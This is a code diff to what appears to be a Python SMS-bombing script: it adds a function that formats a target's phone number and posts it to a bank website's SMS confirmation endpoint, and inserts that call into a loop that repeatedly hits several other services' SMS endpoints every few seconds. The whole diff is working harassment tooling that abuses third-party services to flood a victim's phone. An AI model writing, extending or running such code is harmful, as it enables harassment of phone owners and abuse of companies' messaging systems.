@@ -181,6 +181,15 @@ def novextrade(phone):
                                              'nvx.send_sms_confirm_code'), data=data)
     print(response_novextrade, response_novextrade.content)
 
+def atb(phone):
+    atbphn = '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
+            '-' + phone[8:10]
+    data = {
+        'phone': atbphn,
+        'page': 'new'
+    }
+    response_atb = requests.post(url='https://www.atb.su/local/templates/main/ajax/main/send_sms_new.php', data=data)
+    print(response_atb, response_atb.content)
 
 
 def generate_email():
@@ -212,4 +221,5 @@ def run(phone, n):
                 taxinonstop(phone)
                 sela(phone)
                 novextrade(phone)
+                atb(phone)
                 sleep(6)
